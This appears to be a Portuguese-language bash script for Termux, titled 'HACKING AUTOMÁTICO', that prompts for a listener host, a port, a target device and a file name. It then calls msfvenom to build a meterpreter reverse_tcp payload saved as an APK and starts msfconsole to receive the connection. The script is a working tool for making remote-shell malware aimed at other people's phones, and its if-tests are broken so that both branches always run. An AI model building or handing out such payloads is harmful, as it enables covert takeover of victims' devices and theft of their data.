#! /bin/bash
#
#
#
#Limpar a tela
clear
#
#BANNER
echo "#################################"
echo "#          HACKING              #"
echo "#         AUTOMÁTICO            #"
echo "#                               #"
echo "#                               #"
echo "#################################"
#
#
#Entrando na pasta do metasploit-framework
cd $HOME ; cd metasploit-framework
#
echo
echo
echo "INFORME O HOST DO SEU TERMUX:"
read -p "[+]>>" host
echo
echo  "INFORME A PORTA QUE VOCE QUER USAR:"
read -p "[+]>>" porta
echo
echo "INFORME O DISPOSITIVO QUE VOCE QUER HACKEAR:"
read -p "[+]>>" dispositivo
echo
echo  "INFORME O NOME DO PAYLOAD:"
read -p "[+]>>" nome
#

if [ "$META = 1" ];then
 echo "criando payload..."; sleep 2
./msfvenom -p $dispositivo/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R > /sdcard/$nome.apk

echo "payload criado!"; sleep 2
fi
if [ "$META = 2" ];then 
 echo "iniciando msfconsole..."
./msfconsole
echo "msfconsole executado!"; sleep 2
fi

